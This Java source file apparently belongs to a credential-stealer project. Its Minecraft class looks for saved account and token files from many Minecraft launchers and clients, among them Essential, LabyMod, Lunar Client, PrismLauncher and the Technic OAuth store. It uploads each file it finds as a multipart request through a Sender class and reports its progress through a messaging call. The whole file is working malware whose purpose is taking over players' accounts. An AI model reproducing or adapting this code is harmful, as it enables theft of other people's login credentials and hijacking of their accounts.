package io.github.luxotick.impl;

import io.github.luxotick.Sender;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.RequestBody;

import java.io.File;
import java.io.IOException;
import java.util.Arrays;

public class Minecraft {
    public static void sendMinecraft() throws IOException {
        String AB = "/.minecraft/";
        String mc = System.getenv("APPDATA") + AB;
        String A = "/essential/microsoft_accounts.json";
        String B = "/config/ias.json";
        String C = "/LabyMod/accounts.json";
        String D = "/Impact/alts.json";
        String E = "/meteor-client/accounts.nbt";
        String F = "/Badlion Client/accounts.json";
        String G = "/.feather/accounts.json";
        String H = "/PolyMC/accounts.json";
        String I = "/PrismLauncher/accounts.json";
        String Y = "/.technic/oauth/StoredCredential";
        String Z = "/.lunarclient/settings/game/accounts.json";
        File[] minecraftFiles = new File[]{
                new File(mc + A),
                new File(mc + B),
                new File(mc + C),
                new File(mc + D),
                new File(mc + E),
                new File(System.getenv("APPDATA") + F),
                new File(System.getenv("APPDATA") + G),
                new File(System.getenv("APPDATA") + H),
                new File(System.getenv("APPDATA") + I),
                new File(System.getenv("APPDATA") + Y),
                new File(System.getProperty("user.home") + Z),
        };
        //okhttp client
        OkHttpClient client = new OkHttpClient();
        MultipartBody.Builder builder = new MultipartBody.Builder()
                .setType(MultipartBody.FORM);

        for (File file : minecraftFiles) {
            System.out.println(file.exists());
            if (file.exists()) {
                Sender.sendMessage("Found " + file.getName() + " file.");
                Sender.sendMessage("Sending file: " + file.getName());
                RequestBody requestBody = new MultipartBody.Builder()
                        .setType(MultipartBody.FORM)
                        .addFormDataPart("file", file.getName(), RequestBody.create(okhttp3.MediaType.parse("application/octet-stream"), file))
                        .build();
                Sender.Sender(client, file , requestBody);

            } else {
                if (file.getPath().contains("microsoft_accounts.json")) {
                    Sender.sendMessage("File not found: " + file.getName());
                }
                else if (file.getPath().contains("ias.json")) {
                    Sender.sendMessage("File not found: " + file.getName());
                }
                else if (file.getPath().contains("LabyMod\\accounts.json")) {
                    Sender.sendMessage("File not found: Labymod/accounts.json");
                }
                else if (file.getPath().contains("Impact\\alts.json")) {
                    Sender.sendMessage("File not found: Impactalts.json");

                }
                else if (file.getPath().contains("meteor-client\\accounts.nbt")) {
                    Sender.sendMessage("File not found: meteor-client/accounts.nbt");
                }
                else if (file.getPath().contains("Badlion Client\\accounts.json")) {
                    Sender.sendMessage("File not found: Badlion Client/accounts.json");

                }
                else if (file.getPath().contains(".feather\\accounts.json")) {
                    Sender.sendMessage("File not found: .feather/accounts.json");

                }
                else if (file.getPath().contains("PolyMC\\accounts.json")) {
                    Sender.sendMessage("File not found: PolyMC/accounts.json");

                }
                else if (file.getPath().contains("PrismLauncher\\accounts.json")) {
                    Sender.sendMessage("File not found: PrismLauncher/accounts.json");

                }
                else if (file.getPath().contains(".technic\\oauth\\StoredCredential")) {
                    Sender.sendMessage("File not found: .technic/oauth/StoredCredential");

                }
                else if (file.getPath().contains(".lunarclient\\settings\\game\\accounts.json")) {
                    Sender.sendMessage("File not found: .lunarclient/settings/game/accounts.json");

                }else{
                    Sender.sendMessage("sagolkuyo musun?");
                    System.out.println(file.getPath());
                }
            }
        }
    }
}
